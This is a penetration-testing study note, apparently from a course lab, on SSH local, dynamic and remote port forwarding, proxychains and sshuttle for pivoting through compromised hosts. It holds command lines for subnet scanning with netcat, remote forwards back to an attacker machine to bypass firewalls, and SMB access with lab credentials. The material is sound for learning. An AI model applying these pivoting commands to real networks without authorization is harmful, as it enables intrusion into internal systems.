---
tags: proxychains
---
a.k.a. SSH port forwarding

SSH is a *tunneling protocol*. It was designed specifically to perform tunneling.

SSH:
- all data travels in encrypted tunnel built using SSH protocol
- easily blends into background traffic of network environments (it is often used by network admins for legitimate purposes)
	- can commonly find SSH client software installed on Linux hosts, or even SSH servers running there
	- also common to find OpenSSH client software installed on Windows hosts
- its contents cannot be easily monitored

> Note: Different SSH software will provide slightly different port forwarding capabilities. This unit covers all common SSH port forwarding types offered by OpenSSH.

## SSH Local Port Forwarding

- an SSH connection is made between two hosts (an SSH client and an SSH server)
- a listening port is opened by the SSH client
- all packets received on the listening port are tunneled through the SSH connection to the SSH server
- the packets are then forwarded by the SSH server to the socket we specify

### Scenario

![[Pasted image 20240819135703.png]]

Similar to the scenario in [[Port Forwarding with Linux Tools]], but Socat is not available in CONFLUENCE01

- no Socat in CONFLUENCE01
- still have all credentials cracked on the Confluence database
- still no firewall preventing us from connecting to the ports we bind on CONFLUENCE01

Our setup:
![[Pasted image 20240820112120.png]]

Goal: connect to a host in another internal subnet which has a SMB open

### Enumerating the SMB host 

1. In our shell in CONFLUENCE01, make sure we have TTY functionality:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. ssh into PGDATABASE01 from CONFLUENCE01:
   `ssh database_admin@10.4.50.215`
3. Enumerate:
   `ip addr`
   `ip route`
	- We'll find that PGDATABASE01 is attached to another subnet
4. Reconnaissance of the other subnet (port 445 is SMB):
   `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
	- use a bash loop, because the host does not have a port scanner installed
	- `-z`: check for listening port without sending data
	- `-v`: verbosity
	- `-w 1`: set timeout threshold (lower)
	- We'll find there is a host 172.16.50.217 with port 445 open in the other subnet

### Use SSH local port forwarding to download files in the SMB share to our Kali machine

- The alternative is to download stuff to PGDATABASE01 then transferring it back to CONFLUENCE01 then Kali, but this is very tedious

Create an SSH local port forward:
1. Kill our existing SSH connection from CONFLUENCE01 to PGDATABASE01
2. On CONFLUENCE01, set up the SSH connection for local port forwarding:
   `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`
	- `-N`: prevent a shell from being opened
	- `-L`: set up local port forwarding
		- `0.0.0.0:4455`: listen on all interfaces on port 4455 on CONFLUENCE01
		- `172.16.50.217:445`: forward all packets to port 445 on the newly found host with the SMB server
	- `database_admin@10.4.50.215`: create SSH connection from CONFLUENCE01 to PGDATABASE01 as database_admin
	- Optional `-v` for verbosity (for debugging if the command doesn't work)
3. To make sure that the ssh process we just started is listening on port 4455, connect another shell to CONFLUENCE01 (using another port number on CONFLUENCE01) and use **ss**:
   `ss -ntplu`
4. Finally, we can connect to port 4455 on CONFLUENCE01 from our Kali machine and it will be just like connecting to port 445 on 172.16.50.217:
   `smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234`
   `smbclient -p 4455 //192.168.50.63/scripts -U hr_admin -- password=Welcome1234`
   `ls`
   `get Provisioning.ps1`
5. Now we can inspect the file directly on our Kali machine!

## SSH Dynamic Port Forwarding

> From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.

SSH dynamic port forwarding:
- packets sent to single listening SOCKS port on the SSH client machine
- pushed through the SSH connection, then forwarded to anywhere the SSH server machine can route
- limitation: packets have to be properly formatted (by SOCKS-compatible client software)

Our setup:
![[Pasted image 20240820140709.png|700]]
- we can access any port on any host that PGDATABASE01 has access to!

1. Open reverse shell connection to CONFLUENCE01 from Kali
2. Ensure we are in a TTY shell:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. Create SSH dynamic port forwarding connection to PGDATABASE01
   `ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215`
	- `-N`: prevent spawning a shell
	- `-D`: set up dynamic port forwarding
		- `0.0.0.0:9999`: bind to ip address and port 9999 of CONFLUENCE01

### Tool: Proxychains
- force network traffic from third party tools over HTTP or SOCKS proxies
- can also be configured to push traffic over a chain of concurrent proxies
- will work for most dynamically-linked binaries that perform simple network operations
- won't work for statically-linked binaries

1. On Kali, edit Proxychains config file at `/etc/proxychains4.conf` so that it can locate our SOCKS proxy port and confirm that it's a SOCKS proxy:
   Replace any existing proxy definition in the file with `socks5 192.168.50.63 9999`
	- `socks5`: can also be `socks4`, since SSH supports both
	- `192.168.50.63 9999`: IP address and port of the SOCKS proxy running on CONFLUENCE01
2. Connect from Kali to HRSHARES:
   `proxychains smbclient -L //172.16.50.217/ -U hr_admin -- password=Welcome1234`
	- Just prepend `proxychains` to the original command
	- Proxychains also provides some extra output to show the ports that were interacted with
3. E.g. Can also use Proxychains for port scanning with nmap
   `proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217`
	- Lower the `tcp_read_time_out` and `tcp_connect_time_out` values in the Proxychains configuration file to speed up the port scanning process

## SSH Remote Port Forwarding

Background:
- Firewalls control inbound traffic more than outbound traffic
- We will rarely compromise credentials for an SSH user, allowing direct SSH access to a network for port forwarding
- However, networks often allow traffic (including SSH) out

> SSH remote port forwarding: connect back to an attacker-controlled SSH server, and bind the listening port there (like a reverse shell, but for port forwarding) -> bypass firewall which blocks inbound connection

- Listening port is bound to the SSH server (instead of the SSH client)
- Packets are forwarded by the SSH client (instead of the SSH server)

Our setup:
![[Pasted image 20240820150955.png]]

- we compromised CONFLUENCE01
- but the firewall is configured such that we can only connect to TCP port 8090 on CONFLUENCE01 from our Kali
- CONFLUENCE01 has an SSH client

Goal:
- enumerate the PostgreSQL database running on port 5432 on PGDATABASE01 (CONFLUENCE01 doesn't have the tools for this)

1. enable the SSH server on our Kali machine (using OpenSSH server):
   `sudo systemctl start ssh`
2. Check that SSH port is open as expected:
   `sudo ss -ntplu`
3. Connect reverse shell to CONFLUENCE01 from Kali
4. Make sure we have TTY shell on CONFLUENCE01
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
5. create an SSH remote port forward back to our Kali machine:
   `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`
	- `-N`: no shell
	- `-R`: set up remote port forwarding
	- `127.0.0.1:2345`: listen on port 2345 on our Kali machine
	- `10.4.50.215:5432`: forward all traffic to port 5432 on PGDATABASE01
6. On Kali, check that the remote port forward port is listening:
   `ss -ntplu`
7. We can now connect to PGDATABASE01 port 5432 from Kali directly:
   `psql -h 127.0.0.1 -p 2345 -U postgres`

## SSH Remote Dynamic Port Forwarding
Dynamic port forward in remote configuration
- SOCKS proxy port is bound to the SSH server
- traffic is forwarded from the SSH client

Our setup:
![[Pasted image 20240820161354.png]]

![[Pasted image 20240820161827.png]]

1. Connect CONFLUENCE01 reverse shell from Kali
2. Make sure we have TTY shell in CONFLUENCE01:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. Set up remote dynamic port forwarding:
   `ssh -N -R 9998 kali@192.168.118.4`
4. On Kali, check that the listening port is bound:
   `sudo ss -ntplu`
5. Edit the Proxychains config file on Kali `/etc/proxychains4.conf`:
   Replace any existing proxy definition in the file with `socks5 127.0.0.1 9998`
6. As we did before, we can then run nmap with proxychains against MULTISERVER03:
   `proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64`

## Using [sshuttle](https://github.com/sshuttle/sshuttle)

- easier to manage situations where we have direct access to an SSH server, behind which is a more complex internal network
- turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through SSH tunnel
- requires root privileges on the SSH client and Python3 on the SSH server

Example:
1. set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01:
   `socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
2. on Kali, run sshuttle, specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection (10.4.50.0/24 (containing PGDATABASE01) and 172.16.50.0/24 (containing HRSHARES)):
   `sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`
3. Now, any requests made from Kali to hosts in the subnets specified in step 2 will be pushed transparently through the SSH connection
   E.g. `smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`